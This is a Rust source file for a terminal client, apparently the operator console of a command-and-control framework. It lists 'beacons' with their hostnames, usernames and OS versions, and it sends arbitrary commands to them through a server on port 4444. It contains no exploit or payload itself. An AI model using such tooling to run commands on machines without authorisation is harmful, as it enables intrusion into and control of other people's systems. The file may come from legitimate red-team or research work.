use crate::utils::{ApiClient, Result};
use colored::*;
use rustyline::error::ReadlineError;
use rustyline::DefaultEditor;
use std::path::PathBuf;

/// Terminal-based client for interaction with the server
pub struct Client {
    /// API client for server communication
    api: ApiClient,
    /// Command line editor for user input
    editor: DefaultEditor,
    /// Path to command history file
    history_path: PathBuf,
}

impl Client {
    /// Create a new CLI client
    pub fn new() -> Result<Self> {
        let mut editor = DefaultEditor::new()?;
        let history_path = dirs::home_dir()
            .unwrap_or_default()
            .join(".xclient_history");

        // Load history if it exists
        if editor.load_history(&history_path).is_err() {
            println!("{}", "No previous history.".yellow());
        }

        // Create API client with default server URL
        let api = ApiClient::new(String::from("https://localhost:4444"));

        Ok(Self {
            editor,
            history_path,
            api,
        })
    }

    /// Create a new client with a custom server URL
    pub fn with_server_url(mut self, server_url: String) -> Self {
        self.api = self.api.with_base_url(server_url);
        self
    }

    /// Print available commands
    pub fn print_help(&self) {
        println!("\n{}", "Commands:".green().bold());
        println!("{}-ping server", "ping".cyan());
        println!("{}-list beacons", "beacons".cyan());
        println!("{}-run command", "run <beacon_id> <command>".cyan());
        println!("{}-list commands", "commands <beacon_id>".cyan());
        println!("{}-help", "help".cyan());
        println!("{}-clear", "clear".cyan());
        println!("{}-exit", "exit".cyan());
        println!();
    }

    /// Process a command entered by the user
    pub fn handle_command(&self, command: &str) -> bool {
        let parts: Vec<&str> = command.trim().split_whitespace().collect();
        match parts.get(0).map(|s| *s) {
            Some("exit") | Some("quit") => {
                println!("{}", "Goodbye!".green());
                false
            }
            Some("help") => {
                self.print_help();
                true
            }
            Some("clear") => {
                print!("\x1B[2J\x1B[1;1H");
                true
            }
            Some("ping") => {
                self.handle_ping();
                true
            }
            Some("beacons") => {
                self.handle_list_beacons();
                true
            }
            Some("run") => {
                if parts.len() < 3 {
                    println!("{}", "Usage: run <beacon_id> <command>".red());
                } else {
                    let beacon_id = parts[1];
                    let command = parts[2..].join(" ");
                    self.handle_send_command(beacon_id, &command);
                }
                true
            }
            Some("commands") => {
                if parts.len() != 2 {
                    println!("{}", "Usage: commands <beacon_id>".red());
                } else {
                    self.handle_list_commands(parts[1]);
                }
                true
            }
            Some("") => true,
            Some(cmd) => {
                println!("{} {}", "Unknown command:".red(), cmd);
                true
            }
            None => true,
        }
    }

    /// Handle the ping command
    fn handle_ping(&self) {
        match self.api.ping() {
            Ok(response) => {
                println!("{} {}", "Server response:".green(), response);
            }
            Err(e) => {
                println!("{} {}", "Error:".red(), e);
            }
        }
    }

    /// Handle the beacons command
    fn handle_list_beacons(&self) {
        match self.api.get_beacons() {
            Ok(beacons) => {
                println!("\n{}", "Active Beacons:".green().bold());
                for beacon in beacons {
                    println!(
                        "{}:{}({})",
                        beacon.id.cyan(),
                        beacon.last_seen.yellow(),
                        beacon.status.green()
                    );
                    if let Some(hostname) = &beacon.hostname {
                        println!("Host:{}", hostname.blue());
                    }
                    if let Some(username) = &beacon.username {
                        println!("User:{}", username.blue());
                    }
                    if let Some(os_version) = &beacon.os_version {
                        println!("OS:{}", os_version.blue());
                    }
                    println!("-");
                }
                println!();
            }
            Err(e) => {
                println!("{}:{}", "Error".red(), e);
            }
        }
    }

    /// Handle the send command operation
    fn handle_send_command(&self, beacon_id: &str, command: &str) {
        match self.api.send_command(beacon_id, command) {
            Ok(cmd) => {
                println!(
                    "{} Command {} scheduled for beacon {}",
                    "Success:".green(),
                    cmd.id.to_string().yellow(),
                    cmd.beacon_id.cyan()
                );
            }
            Err(e) => {
                println!("{} {}", "Failed to send command:".red(), e);
            }
        }
    }

    /// Handle the list commands operation
    fn handle_list_commands(&self, beacon_id: &str) {
        match self.api.list_commands(beacon_id) {
            Ok(commands) => {
                if commands.is_empty() {
                    println!(
                        "\n{}No commands found for beacon{}",
                        "Info:".blue(),
                        beacon_id
                    );
                } else {
                    println!(
                        "\n{}for beacon{}:",
                        "Commands".green().bold(),
                        beacon_id.cyan()
                    );
                    for cmd in commands {
                        println!(
                            "ID:{}|Status:{}|Created:{}",
                            cmd.id.to_string().yellow(),
                            cmd.status.green(),
                            cmd.created_at.blue()
                        );
                        println!("Cmd:{}", cmd.command);
                        if let Some(result) = cmd.result {
                            println!("Result:{}", result.green());
                        }
                        if let Some(completed_at) = cmd.completed_at {
                            println!("Done:{}", completed_at.blue());
                        }
                        println!("-");
                    }
                }
                println!();
            }
            Err(e) => {
                println!("{}:{}", "Error".red(), e);
            }
        }
    }

    /// Run the CLI client
    pub fn run(&mut self) -> Result<()> {
        println!("\n{}", "Welcome to XClient!".green().bold());
        self.print_help();

        loop {
            let prompt = ">".cyan().bold().to_string();
            match self.editor.readline(&prompt) {
                Ok(line) => {
                    self.editor.add_history_entry(line.as_str())?;
                    if !self.handle_command(&line) {
                        break;
                    }
                }
                Err(ReadlineError::Interrupted) => {
                    println!("{}", "CTRL-C".yellow());
                    break;
                }
                Err(ReadlineError::Eof) => {
                    println!("{}", "CTRL-D".yellow());
                    break;
                }
                Err(err) => {
                    println!("{} {:?}", "Error:".red(), err);
                    break;
                }
            }
        }

        // Save history
        if let Err(e) = self.editor.save_history(&self.history_path) {
            println!("{} {}", "Failed to save history:".red(), e);
        }

        Ok(())
    }
}
